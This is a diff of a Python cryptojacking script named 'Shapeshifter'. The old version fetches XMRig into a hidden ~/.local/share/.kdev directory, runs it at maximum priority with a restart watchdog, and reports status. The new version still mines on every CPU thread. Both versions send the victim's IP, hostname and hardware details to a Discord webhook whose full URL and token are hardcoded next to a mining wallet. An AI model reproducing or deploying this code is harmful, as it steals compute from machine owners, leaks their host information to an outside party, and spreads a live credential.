@@ -4,122 +4,92 @@ import subprocess
 import time
 import socket
 import requests
+import psutil
 import json
-import tarfile
-from urllib.request import urlretrieve
 
-WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # 🔁 Replace with your real Discord webhook
-WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker001"  # 🔁 Replace with your real Monero wallet
-POOL = "fr.zephyr.herominers.com:1123"  # You can customize this if needed
+# --- Configuration ---
+CONFIG = {
+    "WEBHOOK": "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B",  # Replace with your Discord Webhook URL
+    "WALLET": "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b",  # Replace with your Monero wallet address
+    "POOL": "fr.zephyr.herominers.com:1123",  # You can customize this if needed
+    "WORKER_NAME": "worker001",  # Your worker name
+    "CPU_THROTTLING": "100",  # CPU Throttling (Set between 0 and 100)
+    "GPU_THROTTLING": None,  # GPU Throttling if available, set None if not using GPU
+}
 
-XM_DIR = os.path.expanduser("~/.local/share/.kdev")
-XM_BIN = os.path.join(XM_DIR, "xmrig")
-TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
+# --- Script Logic ---
+def get_system_info():
+    """Gather system information for Discord webhook"""
+    system_info = {
+        "IP": requests.get("https://api.ipify.org").text.strip(),
+        "Hostname": socket.gethostname(),
+        "OS": platform.system() + " " + platform.release(),
+        "Arch": platform.machine(),
+        "CPU": subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip(),
+        "RAM": subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip(),
+        "Threads": str(psutil.cpu_count(logical=True)),
+    }
+    return system_info
 
-os.makedirs(XM_DIR, exist_ok=True)
-
-# Set up logging
-import logging
-logging.basicConfig(filename=os.path.join(XM_DIR, "miner_log.txt"), level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
-
-def download_xmrig():
-    """Download and extract the xmrig binary"""
-    tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
+def send_notification(message):
+    """Send a notification to Discord webhook"""
     try:
-        urlretrieve(TAR_URL, tar_path)
-        logging.info("Download successful.")
-        with tarfile.open(tar_path, "r:gz") as tar:
-            for member in tar.getmembers():
-                if member.name.endswith("xmrig"):
-                    member.name = "xmrig"
-                    tar.extract(member, path=XM_DIR)
-        os.chmod(XM_BIN, 0o755)
-        os.remove(tar_path)
-        logging.info(f"Extraction complete, permissions set on {XM_BIN}")
-        return True
+        requests.post(CONFIG["WEBHOOK"], json={"content": message})
     except Exception as e:
-        logging.error(f"XMRig download failed: {e}")
-        notify(f"❌ XMRig download failed: {e}")
-        return False
+        print(f"Error sending notification: {e}")
 
-def notify(message):
-    """Send a notification via Discord webhook"""
-    try:
-        response = requests.post(WEBHOOK, json={"content": message})
-        response.raise_for_status()  # Raise an error for bad responses (e.g., 404, 500)
-        logging.info(f"Notification sent: {message}")
-    except Exception as e:
-        logging.error(f"Failed to send notification: {e}")
-
-def system_info():
-    """Gather system information for logging purposes"""
-    try:
-        info = {
-            "IP": requests.get("https://api.ipify.org").text.strip(),
-            "Hostname": socket.gethostname(),
-            "OS": platform.system() + " " + platform.release(),
-            "Arch": platform.machine(),
-            "CPU": subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip(),
-            "RAM": subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip(),
-            "Threads": str(os.cpu_count())
-        }
-        return info
-    except Exception as e:
-        logging.error(f"Failed to get system info: {e}")
-        return {"error": str(e)}
+def get_hash_rate():
+    """Retrieve current hash rate (simulated for Monero in this example)"""
+    # You can modify this with actual mining software hash rate retrieval logic
+    hash_rate = "100 H/s"  # This is a simulated value, replace with actual hash rate fetching logic
+    return hash_rate
 
 def start_miner():
-    """Start the miner and return status"""
+    """Start the mining process"""
     try:
-        if not os.path.exists(XM_BIN) or not os.access(XM_BIN, os.X_OK):
-            logging.error(f"Miner binary not found or not executable: {XM_BIN}")
+        cmd = ["xmrig", "-o", CONFIG["POOL"], "-u", CONFIG["WALLET"], "--donate-level", "1", "-k", "-t", str(psutil.cpu_count(logical=True))]
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return process
+    except Exception as e:
+        send_notification(f"❌ Miner failed to start: {e}")
+        raise
+
+def monitor_miner(process):
+    """Monitor the miner process and restart it if needed"""
+    try:
+        stdout, stderr = process.communicate(timeout=10)  # Check for any miner output
+        if process.returncode != 0:
+            send_notification(f"❌ Miner error: {stderr.decode()}")
             return False
-
-        cmd = ["nice", "-n", "-20", XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(os.cpu_count())]
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        logging.info("Miner started successfully.")
         return True
+    except subprocess.TimeoutExpired:
+        return True  # Miner is still running
     except Exception as e:
-        logging.error(f"Failed to start miner: {e}")
-        notify(f"❌ Failed to start miner: {e}")
+        send_notification(f"❌ Miner crash detected: {e}")
         return False
-
-def is_miner_running():
-    """Check if the miner is running"""
-    try:
-        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
-        return "xmrig" in output
-    except Exception as e:
-        logging.error(f"Failed to check miner status: {e}")
-        return False
-
-def watchdog():
-    """Ensure the miner stays running and restart it if necessary"""
-    while True:
-        time.sleep(60)
-        if not is_miner_running():
-            logging.warning("Miner stopped. Attempting to restart...")
-            notify("🔁 Miner not running, restarting...")
-            start_miner()
 
 def main():
-    logging.info("Shapeshifter loader started.")
-    if not os.path.exists(XM_BIN):
-        logging.info("Downloading xmrig...")
-        if not download_xmrig():
-            return
+    """Main script loop"""
+    send_notification("🚀 Shapeshifter Miner starting...")
+    system_info = get_system_info()
+    message = f"✅ Miner Initialized\nIP: {system_info['IP']}\nHostname: {system_info['Hostname']}\nOS: {system_info['OS']}\nCPU: {system_info['CPU']}\nRAM: {system_info['RAM']}\nThreads: {system_info['Threads']}\nWorker: {CONFIG['WORKER_NAME']}"
+    send_notification(message)
 
-    sysinfo = system_info()
-    info_str = "\n".join([f"{k}: {v}" for k, v in sysinfo.items()])
-    notify(f"✅ Shapeshifter Loader\n🧠 Miner initialized\n```{info_str}```")
+    # Start mining
+    miner_process = start_miner()
 
-    if not start_miner():
-        logging.error("Failed to start miner on initial launch.")
-        return
+    while True:
+        time.sleep(600)  # 10 minutes delay
 
-    # Start the watchdog loop
-    watchdog()
+        # Check the mining status and hash rate
+        hash_rate = get_hash_rate()
+        message = f"🧠 Mining Update\nHash Rate: {hash_rate}\nWorker: {CONFIG['WORKER_NAME']}"
+        send_notification(message)
+
+        # Monitor miner process
+        if not monitor_miner(miner_process):
+            send_notification("🔁 Miner restarting...")
+            miner_process = start_miner()
 
 if __name__ == "__main__":
     main()
